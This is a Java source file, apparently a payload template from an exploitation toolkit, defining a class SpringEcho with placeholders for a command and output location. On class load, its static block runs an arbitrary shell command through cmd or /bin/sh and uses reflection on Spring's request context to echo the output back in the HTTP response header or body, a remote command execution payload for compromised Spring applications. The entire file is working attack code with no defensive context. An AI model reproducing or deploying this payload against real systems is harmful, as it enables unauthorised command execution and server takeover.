package payload;

import java.lang.reflect.Method;
import java.util.Scanner;

public class SpringEcho {
    static String headerKey = "{{header}}";
    static String cmd = "{{cmd}}";
    static String action = "{{action}}";
    static String position = "{{position}}";

    public SpringEcho() {
    }

    public static void start() {
        try {
            switch (action) {
                case "echo":
                    Echo(new Scanner(cmd));
                    break;
                case "exec":
                    if (!cmd.isEmpty()) {
                        String[] var11 = new String[3];
                        if (System.getProperty("os.name").toUpperCase().contains("WIN")) {
                            var11[0] = "cmd";
                            var11[1] = "/c";
                        } else {
                            var11[0] = "/bin/sh";
                            var11[1] = "-c";
                        }

                        var11[2] = cmd;
                        Echo(new Scanner(Runtime.getRuntime().exec(var11).getInputStream()));
                    }
            }
        } catch (Exception var3) {
        }

    }

    private static void Echo(Scanner scanner) throws Exception {
        Class var0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
        Method var1 = var0.getMethod("getRequestAttributes");
        Object var2 = var1.invoke((Object)null);
        var0 = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
        var1 = var0.getMethod("getResponse");
        Object var4 = var1.invoke(var2);
        Method var6 = Thread.currentThread().getContextClassLoader().loadClass("javax.servlet.ServletResponse").getDeclaredMethod("getWriter");
        Method var7 = var4.getClass().getDeclaredMethod("addHeader", String.class, String.class);
        var7.setAccessible(true);
        var6.setAccessible(true);
        Object var8 = var6.invoke(var4);
        switch (position) {
            case "header":
                var7.invoke(var4, headerKey, scanner.useDelimiter("\\A").next());
                break;
            case "body":
                var8.getClass().getDeclaredMethod("println", String.class).invoke(var8, scanner.useDelimiter("\\A").next());
                var8.getClass().getDeclaredMethod("flush").invoke(var8);
                var8.getClass().getDeclaredMethod("close").invoke(var8);
        }

    }

    static {
        start();
    }
}
